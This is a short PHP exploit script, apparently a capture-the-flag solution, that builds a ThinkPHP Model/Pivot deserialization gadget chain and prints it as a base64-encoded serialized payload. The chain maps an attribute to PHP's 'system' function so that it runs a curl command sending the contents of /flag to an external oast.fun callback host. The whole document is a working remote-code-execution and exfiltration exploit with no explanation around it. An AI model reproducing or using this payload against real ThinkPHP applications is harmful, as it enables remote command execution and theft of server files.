<?php

namespace think;
abstract class Model {

    private $lazySave = false;
    private $exists = false;
    private $data = [];
    protected $suffix = "";
    protected $name = null;
    protected $connection = "mysql";

    protected $append = [];
    private $relation = [];
    protected $visible = [];
    protected $strict = true;
    private $withAttr = [];


    function __construct($obj){
        if ($obj == null) {
            $this->visible = array("foo"=>array());
            $this->relation = array("foo"=>"curl http://sxielvzhzqayslxhetklcq64byiulay79.oast.fun -d \"$(cat /flag)\"");
            $this->withAttr = array("foo"=>"system");
        }else{
            $this->lazySave = true;
            $this->exists = true;
            $this->data= array("foo"=>"");
            $this->name=$obj;
        }


    }
}






namespace think\model;
class Pivot extends \think\Model{

}

namespace think\model;
echo base64_encode(serialize(new Pivot(new Pivot(null))));
